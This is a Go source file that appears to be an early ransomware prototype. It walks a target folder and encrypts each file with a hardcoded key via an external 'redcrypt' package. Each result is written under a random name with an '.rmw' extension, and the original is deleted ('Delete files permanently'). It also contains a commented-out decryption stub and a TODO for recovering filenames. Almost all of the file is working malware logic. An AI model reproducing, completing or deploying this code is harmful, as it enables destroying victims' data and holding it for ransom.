package main

import (
	"fmt"
	"io/fs"
	"math/rand"
	"os"

	"github.com/Redhead92/redcrypt"
)

const BlockSize = 16

func check (e error){
	if e != nil{
		panic(e)
	}
}

// func keygen() {
// //Use key in smart way to encrypt file
// }

func main() {
	
	testfolder := "C:/Users/super/desktop/test/"
	testkey := "6368616e676520746869732070617373"
	// Decryption testing
	// decfoldertest := "C:/Users/super/Desktop/test/5577006791947779410.rmw"
	// cryptfile,err := os.ReadFile(decfoldertest)
	// check(err)
	// plaintext := reddecrypt.Reddecrypt(testkey,cryptfile)
	
	//TODO:Filename regex

	// orFilename := string(plaintext [len(plaintext)-int(nameOffset)])
	// orFile, err := os.Create(orFilename)
	// check(err)
	// defer orFile.Close()
	// orFile.Write(plaintext)
	// os.Remove(decfoldertest)

	var temppath string
	//var folder 
	// walking system functions
	folder := os.DirFS(testfolder)
	fs.WalkDir(folder, ".", func(path string, info fs.DirEntry, err error) error{
		check(err)
		temppath = testfolder + path
		fileinfo, err := os.Stat(temppath)
		check(err)

		// skip dirs
		if fileinfo.IsDir(){
			
		}else{
				
				plainFile, err := os.ReadFile(temppath)
				check((err))
				plainFile = append(plainFile, []byte(temppath)...)
			// Encrypt new file
				ciphertext := redcrypt.Redcrypt(testkey,[]byte (plainFile))
				fmt.Printf("%x\n", ciphertext)
			// Create new encrypted file, including original extension
				efilepath := testfolder + fmt.Sprint(rand.Int()) + ".rmw"
				encfile, err := os.Create(efilepath)
				check(err)
				defer encfile.Close() 
				encfile.Write(ciphertext)
			
			// Delete files permanently 
				os.Remove(temppath)
				check(err)
			}
		return nil
	})


}


